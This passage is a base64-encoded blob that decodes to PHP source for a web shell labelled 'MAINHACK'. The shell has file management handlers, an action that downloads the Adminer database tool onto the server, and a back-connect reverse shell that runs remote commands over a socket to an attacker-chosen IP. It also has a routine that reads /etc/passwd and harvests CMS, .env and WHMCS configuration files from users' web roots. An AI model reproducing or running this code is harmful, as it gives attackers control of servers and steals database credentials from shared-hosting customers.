lsnUkVRVUVTVF9NRVRIT0QnXSA9PT0gJ1BPU1QnICYmIGlzc2V0KCRfUE9TVFsncGVybWlzc2lvbiddKSkgewogICAgICAgICAkcGVybWlzc2lvbklucHV0ID0gdHJpbSgkX1BPU1RbJ3Blcm1pc3Npb24nXSk7CiAgICAgICAgICRyZXNwb25zZU1lc3NhZ2UgPSBjaGFuZ2VQZXJtaXNzaW9uKCRpdGVtVG9DaG1vZCwgJHBlcm1pc3Npb25JbnB1dCk7CiAgICAgICAgICAkcmVkaXJlY3RVcmwgPSAnP2Rpcj0nIC4gdXJsZW5jb2RlKGRpcm5hbWUoJGl0ZW1Ub0NobW9kKSk7CiAgICAgICAgICAkcmVkaXJlY3RVcmwgLj0gKCRyZXNwb25zZU1lc3NhZ2UgJiYgc3RycG9zKCRyZXNwb25zZU1lc3NhZ2UsICdFcnJvcjonKSAhPT0gMCkgPyAnJnJlc3BvbnNlPScgLiB1cmxlbmNvZGUoJHJlc3BvbnNlTWVzc2FnZSkgOiAnJmVycm9yPScgLiB1cmxlbmNvZGUoJHJlc3BvbnNlTWVzc2FnZSA/OiAnVW5rbm93biBjaG1vZCBlcnJvci4nKTsKICAgICAgICAgIGhlYWRlcignTG9jYXRpb246ICcgLiAkcmVkaXJlY3RVcmwpOwogICAgICAgICAgZXhpdDsKICAgICB9IGVsc2VpZiAoIWZpbGVfZXhpc3RzKCRpdGVtVG9DaG1vZCkpIHsKICAgICAgICAgICRlcnJvck1lc3NhZ2UgPSAnRXJyb3I6IEZpbGUgb3IgZm9sZGVyIHNwZWNpZmllZCBmb3IgY2htb2QgZG9lcyBub3QgZXhpc3QuJzsKICAgICB9Cn0KCi8vIEhhbmRsZSBSZW5hbWUgQWN0aW9uIChUcmlnZ2VyZWQgYnkgSlMgRmV0Y2ggUE9TVCBub3cpCmlmIChpc3NldCgkX0dFVFsncmVuYW1lJ10pKSB7CiAgICAkaXRlbVRvUmVuYW1lID0gJF9HRVRbJ3JlbmFtZSddOwogICAgaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcgJiYgaXNzZXQoJF9QT1NUWyduZXdfbmFtZSddKSkgewogICAgICAgICRuZXdOYW1lUmF3ID0gdHJpbSgkX1BPU1RbJ25ld19uYW1lJ10pOwogICAgICAgICRyZXNwb25zZU1lc3NhZ2UgPSByZW5hbWVGaWxlKCRpdGVtVG9SZW5hbWUsICRuZXdOYW1lUmF3KTsKICAgICAgICAgJHJlZGlyZWN0VXJsID0gJz9kaXI9JyAuIHVybGVuY29kZShkaXJuYW1lKCRpdGVtVG9SZW5hbWUpKTsKICAgICAgICAgICRyZWRpcmVjdFVybCAuPSAoJHJlc3BvbnNlTWVzc2FnZSAmJiBzdHJwb3MoJHJlc3BvbnNlTWVzc2FnZSwgJ0Vycm9yOicpICE9PSAwKSA/ICcmcmVzcG9uc2U9JyAuIHVybGVuY29kZSgkcmVzcG9uc2VNZXNzYWdlKSA6ICcmZXJyb3I9JyAuIHVybGVuY29kZSgkcmVzcG9uc2VNZXNzYWdlID86ICdVbmtub3duIHJlbmFtZSBlcnJvci4nKTsKICAgICAgICAgIGhlYWRlcignTG9jYXRpb246ICcgLiAkcmVkaXJlY3RVcmwpOwogICAgICAgICAgZXhpdDsKICAgIH0gZWxzZWlmICghZmlsZV9leGlzdHMoJGl0ZW1Ub1JlbmFtZSkpIHsKICAgICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiA/ZGlyPScgLiB1cmxlbmNvZGUoZGlybmFtZSgkaXRlbVRvUmVuYW1lKSkgLiAnJmVycm9yPScgLiB1cmxlbmNvZGUoJ0Vycm9yOiBGaWxlIG9yIGZvbGRlciBzcGVjaWZpZWQgZm9yIHJlbmFtZSBkb2VzIG5vdCBleGlzdC4nKSk7CiAgICAgICAgICAgZXhpdDsKICAgICB9Cn0KCi8vIEhhbmRsZSBEZWxldGUgQWN0aW9uIChUcmlnZ2VyZWQgYnkgSlMgRmV0Y2ggR0VUIG5vdykKaWYgKGlzc2V0KCRfR0VUWydkZWxldGUnXSkpIHsKICAgICRpdGVtVG9EZWxldGUgPSAkX0dFVFsnZGVsZXRlJ107CiAgICAkaXRlbURpciA9IGRpcm5hbWUoJGl0ZW1Ub0RlbGV0ZSk7CiAgICBpZiAoaXNfZmlsZSgkaXRlbVRvRGVsZXRlKSkgeyAkcmVzcG9uc2VNZXNzYWdlID0gZGVsZXRlRmlsZSgkaXRlbVRvRGVsZXRlKTsgfQogICAgZWxzZWlmIChpc19kaXIoJGl0ZW1Ub0RlbGV0ZSkpIHsgJHJlc3BvbnNlTWVzc2FnZSA9IGRlbGV0ZUZvbGRlcigkaXRlbVRvRGVsZXRlKTsgfQogICAgZWxzZSB7ICRyZXNwb25zZU1lc3NhZ2UgPSAnRXJyb3I6IEZpbGUgb3IgZm9sZGVyIGRvZXMgbm90IGV4aXN0Lic7IH0KICAgICAkcmVkaXJlY3RVcmwgPSAnP2Rpcj0nIC4gdXJsZW5jb2RlKCRpdGVtRGlyKTsKICAgICAkcmVkaXJlY3RVcmwgLj0gKHN0cnBvcygkcmVzcG9uc2VNZXNzYWdlLCAnRXJyb3I6JykgIT09IDApID8gJyZyZXNwb25zZT0nIC4gdXJsZW5jb2RlKCRyZXNwb25zZU1lc3NhZ2UpIDogJyZlcnJvcj0nIC4gdXJsZW5jb2RlKCRyZXNwb25zZU1lc3NhZ2UpOwogICAgIGhlYWRlcignTG9jYXRpb246ICcgLiAkcmVkaXJlY3RVcmwpOwogICAgIGV4aXQ7Cn0KCmlmIChpc3NldCgkX1BPU1RbJ1N1bW1vbiddKSkgewogICAgJGFkbWluZXJVcmwgPSAnaHR0cHM6Ly9naXRodWIuY29tL3ZyYW5hL2FkbWluZXIvcmVsZWFzZXMvZG93bmxvYWQvdjQuOC4xL2FkbWluZXItNC44LjEucGhwJzsKICAgICRhZG1pbmVyRmlsZU5hbWUgPSAnYWRtaW5lcl80LjguMS5waHAnOwogICAgJGFkbWluZXJGaWxlUGF0aCA9IHJ0cmltKCRjdXJyZW50RGlyZWN0b3J5LCAnLycpIC4gJy8nIC4gJGFkbWluZXJGaWxlTmFtZTsKICAgIGlmICghaXNfd3JpdGFibGUoJGN1cnJlbnREaXJlY3RvcnkpKSB7ICRlcnJvck1lc3NhZ2UgPSAnRXJyb3I6IENhbm5vdCB3cml0ZSB0byBjdXJyZW50IGRpcmVjdG9yeS4gQ2hlY2sgcGVybWlzc2lvbnMuJzsgfQogICAgZWxzZSB7CiAgICAgICAgJGFkbWluZXJDb250ZW50ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCRhZG1pbmVyVXJsKTsKICAgICAgICBpZiAoJGFkbWluZXJDb250ZW50ICE9PSBmYWxzZSkgewogICAgICAgICAgICBpZiAoQGZpbGVfcHV0X2NvbnRlbnRzKCRhZG1pbmVyRmlsZVBhdGgsICRhZG1pbmVyQ29udGVudCkgIT09IGZhbHNlKSB7ICRyZXNwb25zZU1lc3NhZ2UgPSAnQWRtaW5lciAiJyAuIGh0bWxzcGVjaWFsY2hhcnMoJGFkbWluZXJGaWxlTmFtZSkgLiAnIiBzdW1tb25lZCBzdWNjZXNzZnVsbHkuIDxhIGhyZWY9IicgLiBodG1sc3BlY2lhbGNoYXJzKCRhZG1pbmVyRmlsZU5hbWUpIC4gJyIgdGFyZ2V0PSJfYmxhbmsiPk9wZW4gQWRtaW5lcjwvYT4nOyBAY2htb2QoJGFkbWluZXJGaWxlUGF0aCwgMDY0NCk7IH0KICAgICAgICAgICAgZWxzZSB7ICRlcnJvck1lc3NhZ2UgPSAnRmFpbGVkIHRvIHNhdmUgdGhlIHN1bW1vbmVkIEFkbWluZXIgZmlsZS4gQ2hlY2sgcGVybWlzc2lvbnMuJzsgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdjdXJsX2luaXQnKSkgewogICAgICAgICAgICAgICAgICAkY2ggPSBjdXJsX2luaXQoKTsgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJGFkbWluZXJVcmwpOyBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOyBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRk9MTE9XTE9DQVRJT04sIHRydWUpOyBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIGZhbHNlKTsgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1RJTUVPVVQsIDMwKTsKICAgICAgICAgICAgICAgICAgJGFkbWluZXJDb250ZW50Q3VybCA9IGN1cmxfZXhlYygkY2gpOyAkaHR0cENvZGUgPSBjdXJsX2dldGluZm8oJGNoLCBDVVJMSU5GT19IVFRQX0NPREUpOyBjdXJsX2Nsb3NlKCRjaCk7CiAgICAgICAgICAgICAgICAgIGlmICgkaHR0cENvZGUgPT0gMjAwICYmICRhZG1pbmVyQ29udGVudEN1cmwgIT09IGZhbHNlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgaWYgKEBmaWxlX3B1dF9jb250ZW50cygkYWRtaW5lckZpbGVQYXRoLCAkYWRtaW5lckNvbnRlbnRDdXJsKSAhPT0gZmFsc2UpIHsgJHJlc3BvbnNlTWVzc2FnZSA9ICdBZG1pbmVyICInIC4gaHRtbHNwZWNpYWxjaGFycygkYWRtaW5lckZpbGVOYW1lKSAuICciIHN1bW1vbmVkIHZpYSBDVVJMIHN1Y2Nlc3NmdWxseS4gPGEgaHJlZj0iJyAuIGh0bWxzcGVjaWFsY2hhcnMoJGFkbWluZXJGaWxlTmFtZSkgLiAnIiB0YXJnZXQ9Il9ibGFuayI+T3BlbiBBZG1pbmVyPC9hPic7IEBjaG1vZCgkYWRtaW5lckZpbGVQYXRoLCAwNjQ0KTsgfQogICAgICAgICAgICAgICAgICAgICAgIGVsc2UgeyAkZXJyb3JNZXNzYWdlID0gJ0ZhaWxlZCB0byBzYXZlIHRoZSBzdW1tb25lZCBBZG1pbmVyIGZpbGUgKHZpYSBDVVJMKS4gQ2hlY2sgcGVybWlzc2lvbnMuJzsgfQogICAgICAgICAgICAgICAgICB9IGVsc2UgeyAkZXJyb3JNZXNzYWdlID0gJ0ZhaWxlZCB0byBmZXRjaCBBZG1pbmVyIGNvbnRlbnQgdXNpbmcgZmlsZV9nZXRfY29udGVudHMgYW5kIENVUkwuIENoZWNrIHNlcnZlciBjb25uZWN0aXZpdHksIGFsbG93X3VybF9mb3Blbi9DVVJMIGV4dGVuc2lvbiwgYW5kIHRhcmdldCBVUkwuJzsgfQogICAgICAgICAgICAgfSBlbHNlIHsgJGVycm9yTWVzc2FnZSA9ICdGYWlsZWQgdG8gZmV0Y2ggQWRtaW5lciBjb250ZW50LiBgYWxsb3dfdXJsX2ZvcGVuYCBtaWdodCBiZSBkaXNhYmxlZCwgYW5kIENVUkwgaXMgbm90IGF2YWlsYWJsZS4nOyB9CiAgICAgICAgfQogICAgfQp9CgovLyBIYW5kbGUgQmFjayBDb25uZWN0IChCaW5kIFNoZWxsKQovLyBOb3RlOiBUaGlzIGlzIGEgdmVyeSBkYW5nZXJvdXMgZmVhdHVyZS4gVXNlIHdpdGggZXh0cmVtZSBjYXV0aW9uLgppZiAoaXNzZXQoJF9QT1NUWydiaW5kJ10pICYmIGlzc2V0KCRfUE9TVFsnaXAnXSkgJiYgaXNzZXQoJF9QT1NUWydwb3J0J10pKSB7CiAgICAkaXAgPSB0cmltKCRfUE9TVFsnaXAnXSk7CiAgICAkcG9ydCA9IGZpbHRlcl92YXIodHJpbSgkX1BPU1RbJ3BvcnQnXSksIEZJTFRFUl9WQUxJREFURV9JTlQpOwogICAgaWYgKCEkcG9ydCB8fCAkcG9ydCA8PSAwIHx8ICRwb3J0ID4gNjU1MzUpIHsgJGVycm9yTWVzc2FnZSA9ICc8cCBzdHlsZT0iY29sb3I6IHJlZDsiPkludmFsaWQgcG9ydCBudW1iZXIuPC9wPic7IH0KICAgIGVsc2VpZiAoIWZpbHRlcl92YXIoJGlwLCBGSUxURVJfVkFMSURBVEVfSVApKSB7ICRlcnJvck1lc3NhZ2UgPSAnPHAgc3R5bGU9ImNvbG9yOiByZWQ7Ij5JbnZhbGlkIElQIGFkZHJlc3MgZm9ybWF0LjwvcD4nOyB9CiAgICBlbHNlIHsKICAgICAgICAkZXJyb3JNZXNzYWdlID0gJzxwPkF0dGVtcHRpbmcgQ29ubmVjdGlvbiB0byAnIC4gaHRtbHNwZWNpYWxjaGFycygkaXApIC4gJzonIC4gaHRtbHNwZWNpYWxjaGFycygkcG9ydCkgLiAnLi4uPC9wPic7CiAgICAgICAgJHNvY2tmZCA9IEBmc29ja29wZW4oJGlwLCAkcG9ydCwgJGVycm5vLCAkZXJyc3RyLCAxMCk7CiAgICAgICAgaWYgKCEkc29ja2ZkKSB7ICRlcnJvck1lc3NhZ2UgLj0gIjxwIHN0eWxlPSdjb2xvcjogcmVkOyc+Q29ubmVjdGlvbiBmYWlsZWQ6ICgkZXJybm8pICRlcnJzdHI8L3A+IjsgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAgQGZwdXRzKCRzb2NrZmQsICJ7IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI31cbiIpOwogICAgICAgICAgICAgQGZwdXRzKCRzb2NrZmQsICIuLjo6IFBIUCBCYWNrY29ubmVjdCBTaGVsbCB2aWEgTUFJTkhBQ0sgOjouLlxuIik7CiAgICAgICAgICAgICBAZnB1dHMoJHNvY2tmZCwgIiBVc2VyOiAiIC4gQGdldF9jdXJyZW50X3VzZXIoKSAuICIgfCBTeXN0ZW06ICIgLiBAcGhwX3VuYW1lKCdzJykgLiAiICIgLiBAcGhwX3VuYW1lKCdyJykgLiAiXG4iKTsKICAgICAgICAgICAgIEBmcHV0cygkc29ja2ZkLCAiIFRpbWU6ICIgLiBkYXRlKCdZLW0tZCBIOmk6cyBUJykgLiAiXG4iKTsKICAgICAgICAgICAgIEBmcHV0cygkc29ja2ZkLCAieyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyN9XG5cbiIpOwogICAgICAgICAgICAgJGxlbiA9IDQwOTY7ICRjd2QgPSBnZXRDdXJyZW50RGlyZWN0b3J5KCk7CiAgICAgICAgICAgICB3aGlsZSAoIWZlb2YoJHNvY2tmZCkpIHsKICAgICAgICAgICAgICAgICAgQGZwdXRzKCRzb2NrZmQsICdbJyAuIEBnZXRfY3VycmVudF91c2VyKCkgLiAnQCcgLiBAZ2V0aG9zdG5hbWUoKSAuICcgJyAuIGJhc2VuYW1lKCRjd2QpIC4gJ10kICcpOwogICAgICAgICAgICAgICAgICAkY29tbWFuZCA9IEBmZ2V0cygkc29ja2ZkLCAkbGVuKTsgaWYgKCRjb21tYW5kID09PSBmYWxzZSkgYnJlYWs7ICRjb21tYW5kID0gdHJpbSgkY29tbWFuZCk7IGlmIChlbXB0eSgkY29tbWFuZCkpIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgICBpZiAocHJlZ19tYXRjaCgnL15jZFxzKyguKikvaScsICRjb21tYW5kLCAkbWF0Y2hlcykpIHsKICAgICAgICAgICAgICAgICAgICAgICRuZXdEaXIgPSB0cmltKCRtYXRjaGVzWzFdKTsgaWYgKCRuZXdEaXIgPT09ICcnKSAkbmV3RGlyID0gJ34nOwogICAgICAgICAgICAgICAgICAgICAgIGlmICgkbmV3RGlyID09PSAnficgfHwgc3RycG9zKCRuZXdEaXIsICd+LycpID09PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaG9tZSA9IGdldGVudignSE9NRScpOyBpZiAoJGhvbWUpIHsgJG5ld0RpciA9ICRob21lIC4gKCRuZXdEaXIgPT09ICd+JyA/ICcnIDogc3Vic3RyKCRuZXdEaXIsIDEpKTsgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7IEBmcHV0cygkc29ja2ZkLCAiRXJyb3I6IENvdWxkIG5vdCByZXNvbHZlIGhvbWUgZGlyZWN0b3J5IChIT01FIGVudiB2YXIgbm90IHNldCkuXG4iKTsgY29udGludWU7IH0KICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICBpZiAoQGNoZGlyKCRuZXdEaXIpKSB7ICRjd2QgPSBnZXRDdXJyZW50RGlyZWN0b3J5KCk7IEBmcHV0cygkc29ja2ZkLCAiQ2hhbmdlZCBkaXJlY3RvcnkgdG86ICIgLiAkY3dkIC4gIlxuIik7IH0KICAgICAgICAgICAgICAgICAgICAgIGVsc2UgeyBAZnB1dHMoJHNvY2tmZCwgIkVycm9yOiBDb3VsZCBub3QgY2hhbmdlIGRpcmVjdG9yeSB0byAnIiAuIGh0bWxzcGVjaWFsY2hhcnMoJG5ld0RpcikgLiAiJy5cbiIpOyB9CiAgICAgICAgICAgICAgICAgIH0gZWxzZSB7ICRjbWRPdXRwdXRCQyA9IGV4ZWN1dGVDb21tYW5kKCRjb21tYW5kKTsgQGZwdXRzKCRzb2NrZmQsICRjbWRPdXRwdXRCQyAuICJcbiIpOyB9CiAgICAgICAgICAgICB9CiAgICAgICAgICAgICBAZmNsb3NlKCRzb2NrZmQpOyAkcmVzcG9uc2VNZXNzYWdlID0gIjxwIHN0eWxlPSdjb2xvcjogZ3JlZW47Jz5CYWNrY29ubmVjdCBzZXNzaW9uIHRlcm1pbmF0ZWQuPC9wPiI7CiAgICAgICAgfQogICAgfQp9CgppZiAoaXNzZXQoJF9QT1NUWydjcmVhdGVfZmlsZSddKSAmJiBpc3NldCgkX0dFVFsnY3JlYXRlJ10pICYmICRfR0VUWydjcmVhdGUnXSA9PT0gJ2ZpbGUnKSB7CiAgICAkZmlsZU5hbWVSYXcgPSB0cmltKCRfUE9TVFsnZmlsZV9uYW1lJ10pOyAkZmlsZU5hbWUgPSBiYXNlbmFtZSgkZmlsZU5hbWVSYXcpOwogICAgaWYgKGVtcHR5KCRmaWxlTmFtZSkgfHwgJGZpbGVOYW1lID09PSAnLicgfHwgJGZpbGVOYW1lID09PSAnLi4nKSB7ICRlcnJvck1lc3NhZ2UgPSAnRXJyb3I6IEludmFsaWQgZmlsZSBuYW1lLic7IH0KICAgIGVsc2UgewogICAgICAgICRmaWxlUGF0aCA9IHJ0cmltKCRjdXJyZW50RGlyZWN0b3J5LCAnLycpIC4gJy8nIC4gJGZpbGVOYW1lOwogICAgICAgICBpZiAocmVhbHBhdGgoJGZpbGVQYXRoKSA9PT0gX19GSUxFX18pIHsgJGVycm9yTWVzc2FnZSA9ICdFcnJvcjogQ2Fubm90IGNyZWF0ZSBmaWxlIHdpdGggdGhlIHNhbWUgbmFtZSBhcyB0aGUgc2hlbGwuJzsgfQogICAgICAgICBlbHNlaWYgKGZpbGVfZXhpc3RzKCRmaWxlUGF0aCkpIHsgJGVycm9yTWVzc2FnZSA9ICdFcnJvcjogRmlsZSAiJyAuIGh0bWxzcGVjaWFsY2hhcnMoJGZpbGVOYW1lKSAuICciIGFscmVhZHkgZXhpc3RzLic7IH0KICAgICAgICAgZWxzZSB7IGlmIChAdG91Y2goJGZpbGVQYXRoKSkgeyBAY2htb2QoJGZpbGVQYXRoLCAwNjQ0KTsgJHJlc3BvbnNlTWVzc2FnZSA9ICdGaWxlIGNyZWF0ZWQgc3VjY2Vzc2Z1bGx5OiAnIC4gaHRtbHNwZWNpYWxjaGFycygkZmlsZU5hbWUpOyB9CiAgICAgICAgICAgICAgICBlbHNlIHsgJGVycm9yID0gZXJyb3JfZ2V0X2xhc3QoKTsgJGVycm9yTWVzc2FnZSA9ICdFcnJvcjogRmFpbGVkIHRvIGNyZWF0ZSBmaWxlLiAnIC4gKCRlcnJvciA/IGh0bWxzcGVjaWFsY2hhcnMoJGVycm9yWydtZXNzYWdlJ10pIDogJ0NoZWNrIHBlcm1pc3Npb25zLicpOyB9CiAgICAgICAgfQogICAgfQp9CgppZiAoaXNzZXQoJF9QT1NUWydjcmVhdGVfZm9sZGVyJ10pICYmIGlzc2V0KCRfR0VUWydjcmVhdGUnXSkgJiYgJF9HRVRbJ2NyZWF0ZSddID09PSAnZm9sZGVyJykgewogICAgJGZvbGRlck5hbWVSYXcgPSB0cmltKCRfUE9TVFsnZm9sZGVyX25hbWUnXSk7ICRmb2xkZXJOYW1lID0gYmFzZW5hbWUoJGZvbGRlck5hbWVSYXcpOwogICAgaWYgKGVtcHR5KCRmb2xkZXJOYW1lKSB8fCAkZm9sZGVyTmFtZSA9PT0gJy4nIHx8ICRmb2xkZXJOYW1lID09PSAnLi4nKSB7ICRlcnJvck1lc3NhZ2UgPSAnRXJyb3I6IEludmFsaWQgZm9sZGVyIG5hbWUuJzsgfQogICAgZWxzZSB7CiAgICAgICAgJGZvbGRlclBhdGggPSBydHJpbSgkY3VycmVudERpcmVjdG9yeSwgJy8nKSAuICcvJyAuICRmb2xkZXJOYW1lOwogICAgICAgIGlmIChmaWxlX2V4aXN0cygkZm9sZGVyUGF0aCkpIHsgJGVycm9yTWVzc2FnZSA9ICdFcnJvcjogRm9sZGVyICInIC4gaHRtbHNwZWNpYWxjaGFycygkZm9sZGVyTmFtZSkgLiAnIiBhbHJlYWR5IGV4aXN0cy4nOyB9CiAgICAgICAgZWxzZSB7IGlmIChAbWtkaXIoJGZvbGRlclBhdGgsIDA3NTUpKSB7ICRyZXNwb25zZU1lc3NhZ2UgPSAnRm9sZGVyIGNyZWF0ZWQgc3VjY2Vzc2Z1bGx5OiAnIC4gaHRtbHNwZWNpYWxjaGFycygkZm9sZGVyTmFtZSk7IH0KICAgICAgICAgICAgICAgZWxzZSB7ICRlcnJvciA9IGVycm9yX2dldF9sYXN0KCk7ICRlcnJvck1lc3NhZ2UgPSAnRXJyb3I6IEZhaWxlZCB0byBjcmVhdGUgZm9sZGVyLiAnIC4gKCRlcnJvciA/IGh0bWxzcGVjaWFsY2hhcnMoJGVycm9yWydtZXNzYWdlJ10pIDogJ0NoZWNrIHBlcm1pc3Npb25zLicpOyB9CiAgICAgICAgfQogICAgfQp9CgovLyBIYW5kbGUgQ29uZmlnIEdyYWJiaW5nICgnZ29vPWNvbmZpZycpIC0gREFOR0VST1VTIEZFQVRVUkUKaWYgKGlzc2V0KCRfR0VUWydnb28nXSkgJiYgJF9HRVRbJ2dvbyddID09ICdjb25maWcnKSB7CiAgICAkY29uZmlnRGlyTmFtZSA9ICJNSF9jb25maWdzXyIgLiBkYXRlKCdZbWRIaXMnKTsgJGNvbmZpZ0RpclBhdGggPSBydHJpbSgkY3VycmVudERpcmVjdG9yeSwgJy8nKSAuICcvJyAuICRjb25maWdEaXJOYW1lOyAkY29uZmlnRmlsZXNGb3VuZCA9IFtdOwogICAgJHBhc3N3ZFBhdGggPSAiL2V0Yy9wYXNzd2QiOwogICAgaWYgKCFpc19yZWFkYWJsZSgkcGFzc3dkUGF0aCkpIHsgJGVycm9yTWVzc2FnZSA9ICI8cHJlPjxmb250IGNvbG9yPXJlZD5FcnJvcjogQ2FuJ3QgcmVhZCAvZXRjL3Bhc3N3ZC4gQ29uZmlnIGdyYWJiaW5nIGFib3J0ZWQuPC9mb250PjwvcHJlPiI7IH0KICAgIGVsc2UgewogICAgICAgIGlmICghQG1rZGlyKCRjb25maWdEaXJQYXRoLCAwNzU1KSkgeyAkZXJyb3IgPSBlcnJvcl9nZXRfbGFzdCgpOyAkZXJyb3JNZXNzYWdlID0gIjxwcmU+PGZvbnQgY29sb3I9cmVkPkVycm9yOiBGYWlsZWQgdG8gY3JlYXRlIGNvbmZpZyBkaXJlY3RvcnkgJyRjb25maWdEaXJOYW1lJy4gIiAuICgkZXJyb3IgPyBodG1sc3BlY2lhbGNoYXJzKCRlcnJvclsnbWVzc2FnZSddKSA6ICdDaGVjayBwZXJtaXNzaW9ucy4nKSAuICI8L2ZvbnQ+PC9wcmU+IjsgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAgJGh0YWNjZXNzQ29udGVudCA9ICJPcHRpb25zIC1JbmRleGVzXG5EZW55IGZyb20gYWxsXG4iOyBAZmlsZV9wdXRfY29udGVudHMoJGNvbmZpZ0RpclBhdGggLiAnLy5odGFjY2VzcycsICRodGFjY2Vzc0NvbnRlbnQpOwogICAgICAgICAgICAgJHJlc3BvbnNlTWVzc2FnZSA9ICI8cD5TdGFydGluZyBjb25maWcgc2Nhbi4uLiBSZXN1bHRzIHdpbGwgYmUgaW4gPGEgaHJlZj0nP2Rpcj0iIC4gdXJsZW5jb2RlKCRjb25maWdEaXJQYXRoKSAuICInPiIgLiBodG1sc3BlY2lhbGNoYXJzKCRjb25maWdEaXJOYW1lKSAuICI8L2E+PC9wPiI7CiAgICAgICAgICAgICAkZXRjID0gQGZvcGVuKCRwYXNzd2RQYXRoLCAiciIpOwogICAgICAgICAgICAgaWYgKCEkZXRjKSB7ICRlcnJvck1lc3NhZ2UgPSAiPHByZT48Zm9udCBjb2xvcj1yZWQ+RXJyb3I6IEZhaWxlZCB0byBvcGVuIC9ldGMvcGFzc3dkIGFmdGVyIGluaXRpYWwgcmVhZCBjaGVjay48L2ZvbnQ+PC9wcmU+IjsgfQogICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgIHdoaWxlICgoJHBhc3N3ZExpbmUgPSBmZ2V0cygkZXRjKSkgIT09IGZhbHNlKSB7CiAgICAgICAgICAgICAgICAgICAgICAkcGFzc3dkTGluZSA9IHRyaW0oJHBhc3N3ZExpbmUpOyBpZiAoZW1wdHkoJHBhc3N3ZExpbmUpIHx8IHN0cnBvcygkcGFzc3dkTGluZSwgJzp4OicpID09PSBmYWxzZSkgY29udGludWU7CiAgICAgICAgICAgICAgICAgICAgICBpZiAocHJlZ19tYXRjaCgnL14oW146XSspOng6LycsICRwYXNzd2RMaW5lLCAkdXNlck1hdGNoZXMpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgJHVzZXJuYW1lID0gJHVzZXJNYXRjaGVzWzFdOyAkaG9tZURpckd1ZXNzID0gIi9ob21lLyR1c2VybmFtZSI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgJHdlYlJvb3RHdWVzc2VzID0gWyAiJGhvbWVEaXJHdWVzcy9wdWJsaWNfaHRtbCIsICIkaG9tZURpckd1ZXNzL3d3dyIsICIkaG9tZURpckd1ZXNzL2h0ZG9jcyIsIF07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICRjb25maWdDaGVja3MgPSBbICd3cC1jb25maWcucGhwJyA9PiAnV29yZFByZXNzJywgJ2NvbmZpZ3VyYXRpb24ucGhwJyA9PiAnSm9vbWxhX1dITUNTJywgJ2NvbmZpZy9jb25maWcuaW5jLnBocCcgPT4gJ1ByZXN0YVNob3AnLCAnYXBwL2V0Yy9sb2NhbC54bWwnID0+ICdNYWdlbnRvMScsICdhcHAvZXRjL2Vudi5waHAnID0+ICdNYWdlbnRvMicsICdzaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCcgPT4gJ0RydXBhbCcsICcuZW52JyA9PiAnTGFyYXZlbF9TeW1mb255X2V0YycsICdjb25maWcucGhwJyA9PiAnR2VuZXJpY19jb25maWcnLCAnYXBwbGljYXRpb24vY29uZmlnL2RhdGFiYXNlLnBocCcgPT4gJ0NvZGVJZ25pdGVyX0RCJywgJ2luY2x1ZGVzL2NvbmZpZy5waHAnID0+ICd2QnVsbGV0aW5fT3NDb21tZXJjZScsICd3aG1jcy9jb25maWd1cmF0aW9uLnBocCcgPT4gJ1dITUNTX3N1YmRpcicsICdzdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJyA9PiAnV0hNQ1Nfc3VwcG9ydCcsICdzZWN1cmUvY29uZmlndXJhdGlvbi5waHAnID0+ICdXSE1DU19zZWN1cmUnLCAnY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcgPT4gJ1dITUNTX2NsaWVudHMnLCAnY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJyA9PiAnV0hNQ1NfY2xpZW50JywgJ2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnID0+ICdXSE1DU19iaWxsaW5nJywgJ2FkbWluL2NvbmZpZy5waHAnID0+ICdPcGVuQ2FydF9hZG1pbl9jb25maWcnLCAnY29uZmlnLnBocCcgPT4gJ09wZW5DYXJ0X3Jvb3RfY29uZmlnJywgXTsKICAgICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoICgkd2ViUm9vdEd1ZXNzZXMgYXMgJHdlYlJvb3REaXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGlzX2Rpcigkd2ViUm9vdERpcikgJiYgaXNfcmVhZGFibGUoJHdlYlJvb3REaXIpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoICgkY29uZmlnQ2hlY2tzIGFzICRjb25maWdGaWxlUmVsYXRpdmUgPT4gJGNvbmZpZ1R5cGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGZ1bGxDb25maWdQYXRoID0gJHdlYlJvb3REaXIgLiAnLycgLiAkY29uZmlnRmlsZVJlbGF0aXZlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoaXNfcmVhZGFibGUoJGZ1bGxDb25maWdQYXRoKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNvbmZpZ0NvbnRlbnQgPSBAZmlsZV9nZXRfY29